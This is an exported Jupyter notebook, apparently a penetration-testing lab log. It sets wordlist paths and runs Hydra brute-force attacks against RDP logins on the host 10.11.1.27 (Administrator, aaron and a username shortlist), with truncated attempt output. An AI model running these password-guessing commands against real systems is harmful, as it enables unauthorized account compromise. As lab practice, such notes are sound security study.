# %%
# %env TARGET=10.11.1.27
# Out:
# env: TARGET=10.11.1.27

# %%
# %env PL=/usr/share/wordlists/SecLists/Passwords/probable-v2-top207.txt
# %env PL_S=/home/parallels/hax/SecLists/Passwords/probable-v2-top1575.txt
# %env PL=/usr/share/wordlists/rockyou.txt

# %env UL=/home/parallels/hax/SecLists/Usernames/Names/names.txt
# %env UL_S=/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt

# %env USER=user
# Out:
# env: PL_S=/home/parallels/hax/SecLists/Passwords/probable-v2-top1575.txt
# env: PL=/usr/share/wordlists/rockyou.txt
# env: UL=/home/parallels/hax/SecLists/Usernames/Names/names.txt
# env: UL_S=/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
# env: USER=user

# %%
# !hydra -V -l Administrator -P $PL_S rdp://$TARGET
# Out:
# Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
#
# Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-12 16:43:17
# [WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
# [INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
# [WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
# [DATA] max 4 tasks per 1 server, overall 4 tasks, 1575 login tries (l:1/p:1575), ~394 tries per task
# [DATA] attacking rdp://10.11.1.27:3389/
# [ATTEMPT] target 10.11.1.27 - login "Administrator" - pass "123456" - 1 of 1575 [child 0] (0/0)
# ...

# %%
# !hydra -V -l aaron -P $PL_S rdp://$TARGET
# Out:
# Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
#
# Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-12 16:45:55
# [WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
# [INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
# [WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
# [DATA] max 4 tasks per 1 server, overall 4 tasks, 1575 login tries (l:1/p:1575), ~394 tries per task
# [DATA] attacking rdp://10.11.1.27:3389/
# [ATTEMPT] target 10.11.1.27 - login "aaron" - pass "123456" - 1 of 1575 [child 0] (0/0)
# [ATTEMPT] target 10.11.1.27 - login "aaron" - pass "password" - 2 of 1575 [child 1] (0/0)
# ...

# %%
# !hydra -V -L $UL_S -P $PL_S rdp://$TARGET
# Out:
# Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
#
# Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-12 16:46:10
# [WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
# [INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
# [WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
# [DATA] max 4 tasks per 1 server, overall 4 tasks, 26775 login tries (l:17/p:1575), ~6694 tries per task
# [DATA] attacking rdp://10.11.1.27:3389/
# [ATTEMPT] target 10.11.1.27 - login "root" - pass "123456" - 1 of 26775 [child 0] (0/0)
# [ATTEMPT] target 10.11.1.27 - login "root" - pass "password" - 2 of 26775 [child 1] (0/0)
# ...
